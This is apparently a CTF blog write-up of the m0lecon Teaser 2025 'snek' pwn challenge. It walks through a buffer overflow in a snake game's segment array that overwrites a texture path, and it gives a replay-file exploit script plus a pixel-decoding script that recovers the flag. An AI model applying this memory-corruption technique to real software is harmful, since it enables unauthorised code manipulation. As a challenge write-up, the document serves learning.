---
title: m0lecon Teaser 2025 pwn snek writeup
categories:
  - ctf
tags:
  - bof
  - pwn
pin: true
image:
  path: /assets/img/snek.png
  alt: snek
published: true
---

# Thoughts
This weekend my team and I played m0lecon. Overall, the event had high-quality challenges and gave me a lot of material to study. :)

# An interesting challenge

![chall_desc](/assets/img/snek_description.png)

I have to say, I never thought I’d try a snake-like game in a CTF, but here we are. Pwn isn’t my main category and I’m not an SDL expert, but I’ll do my best to explain my thought process.

# opening in ghidra & debugging

```c
undefined8 main(undefined4 param_1,undefined8 param_2)

{
  parse_args(param_1,param_2);
  sdl_init();
  game_init();
  game_loop();
  quit(0);
  return 0;
}
```

Upon opening main in Ghidra we can see the binary is not stripped and that it calls sdl_init() and game_loop(). It also parses arguments from the command line.

Let's use checksec to inspect the binary protections:

```
pwndbg> checksec
File:     /home/makider/ctf/m0lec0n/snek/game/snek
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Everything is enabled, which means that we have to create either a full ROP chain, shellcode execution... or some other way to leak the flag.

If we try to run the application in the terminal with `--help` we get: <br>
`snek: Usage: ./snek [--help] [--scale N] [{--record|--replay|--fast-replay} replay.txt]`

By using a text file containing key presses, we can replay recorded actions.

![mainfunc](/assets/img/snek_game.png)

For example: `....WA...S......D`. <br>`WASD` correspond to the typical movement keys while `.` indicates inactivity.

we can see in the function `record_replay_action`:

```c
  switch(param_1) {
  default:
    SDL_LogCritical(0,"Internal error: trying to record bad action (%d)",param_1);
    quit(1);
    break;
  case 1:
    local_9 = 'W';
    break;
  case 2:
    local_9 = 'S';
    break;
  case 3:
    local_9 = 'A';
    break;
  case 4:
    local_9 = 'D';
    break;
  case 0xffffffff:
    local_9 = '.';
  }
```
In this game we have only three lives and a score that increases as we eat apples, which spawn pseudo-randomly from a fixed seed.

After some time in the debugger modifying memory values, we will find a buffer overflow in the array containing the coordinates of the snake segments: if `snake_length > 100`, it begins to write segment coordinates into adjacent memory.

since the binary is not stripped, we can see in `vmmap` snek's location easily

```
pwndbg> vmmap snek
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
►   0x55555555a000     0x55555555b000 rw-p     1000   5000 snek
```

And by using `telescope` `tel 0x55555555a000 100` we can inspect memory contents:

```
08:0040│  0x55555555a040 (snek) ◂— 0x12f0002012f0003
09:0048│  0x55555555a048 (snek+8) ◂— 0x12f0000012f0001
0a:0050│  0x55555555a050 (snek+16) ◂— 0x12e0001012e0000
0b:0058│  0x55555555a058 (snek+24) ◂— 0x12e0003012e0002
0c:0060│  0x55555555a060 (snek+32) ◂— 0x12e0005012e0004

... (cut)

38:01c0│  0x55555555a1c0 (snek+384) ◂— 0x125000601250007
39:01c8│  0x55555555a1c8 (snek+392) ◂— 0x125000401250005
3a:01d0│  0x55555555a1d0 ◂— 0x125000201250003    <-- overflow!
3b:01d8│  0x55555555a1d8 ◂— 0x125000001250001
3c:01e0│  0x55555555a1e0 (texture_info) ◂— 0x7365727501240000
```

We can see the snake tail has overflowed and overwritten `texture_info`, which would normally contain a static value like:
`3c:01e0│ 0x55555555a1e0 (texture_info) ◂— 'textures/apple.bin'`

The overwritten bytes are quite large, far beyond what would normally fit into a 10×10 grid. This behavior allows us to write arbitrary bytes because the segment coordinates are increased/decreased outside the grid and later reduced with % 10 in `draw_snek`.

This is a cleaned up version of what the function looks like:

```c
void draw_snek(void)
{
    /* Draw body segments (index 1 .. snek_length-1) */
    for (size_t i = 1; i < snek_length; ++i) {
        unsigned int x = (unsigned int)(snek_positions[i]) % 10;
        unsigned int y = (unsigned int)(snek_positions_y[i]) % 10;
        draw_texture(x, y, TEXTURE_BODY);
    }

    /* Draw head (index 0) */
    unsigned int head_x = (unsigned int)(snek_positions[0]) % 10;
    unsigned int head_y = (unsigned int)(snek_positions_y[0]) % 10;
    draw_texture(head_x, head_y, TEXTURE_HEAD);
}
```

As you can see, all the snake segments are stored in the `snek_positions` array, iterated in a loop, wrapped using % 10, and then drawn to the screen.

You may be wondering how a 100+ segment snake can fit in a 10×10 grid. This works because of a noclip bug: when the snake moves along the same axis and wraps around, it effectively teleports to the other side without colliding with itself.

Note: when you exhaust all lives the game automatically saves a screenshot to /tmp/snek.png.


# the plan
So, how do we exploit this?
Some readers will probably have noticed that the adjacent memory is 
`3c:01e0│  0x55555555a1e0 (texture_info) ◂— 'textures/apple.bin'`

Which means that we can try to overflow to that memory location and write flag\x00 in LSB which is `0x0067616c66`.

To do this we have to spend two lives. First overflow and write the 0x00 byte, and then perform the rest of the write. We must align the tail perfectly so that y becomes 0x6761 and x becomes 0x6c66.
To do this i have made a small script which generates a replay file.

**Here's the plan:**

- First, get a length of 103 and overflow.
- Then align the tail on the X axis to reach a value of 0x1000, this places the \x00 byte that terminates "flag".
- Kill the snake to reset snake_length to 3.
- Next, get a length of 102 and overflow again.
- Align the X axis to 0x6c66 and the Y axis to 0x6761.
- Finally, kill the snake to force a texture reload via game_init().

Here is the `game_init()` function that calls `load_textures()`
```c
void game_init(void)

{
  load_textures();
  snek_init();
  apple_move();
  return;
}
```

Here's my commented solve script:

```py
# overflow and write null btye
payload = "..." + ("SA........SD........"*155) + "SD"
payload += 'A'*(0x1000+0x5c)

payload += 'WAS' # kill

# overflow and write flag\x00 in LSB (\x00galf 0x0067616c66)
payload += "..." + ("SA........SD........"*150) + "SD"
payload += 'A'*(0x6c66-0xa)  
payload += 'W'*(0x6761+0x32d5)
payload += 'DSA' # kill

# trigger game over 
payload += "..." + ("SA........SD........"*10)
payload += 'SAW' # kill

with open("output.txt", "w") as wr:
	wr.write(payload)
```

After the textures are reloaded, the flag’s color values appear as an apple:

![mainfunc](/assets/img/snek.png)

To get the actual flag we can parse the RGB color values as chr() in the ascii table. to do this i have created this script with the help of GPT:

```py
from PIL import Image
from collections import deque

# Number of last non-black pixels to track
N = 5  # this is the estimated lenght of the flag divided by 3, you can also set this to a high number and get the last flag like bytes

# Open the image
img = Image.open("/tmp/snek.png").convert("RGBA")
width, height = img.size
pixels = img.load()

# Keep last N non-black pixels
last_pixels = deque(maxlen=N)

for y in range(height):
    for x in range(width):
        r, g, b, a = pixels[x, y]
        if (r, g, b) != (0, 0, 0):
            last_pixels.append((r, g, b))

# Flatten into a single array
flat_array = []
for rgb in last_pixels:
    flat_array.extend(rgb)

for i in flat_array:
    print(chr(i), end="")
```

**thank you for reading!** <3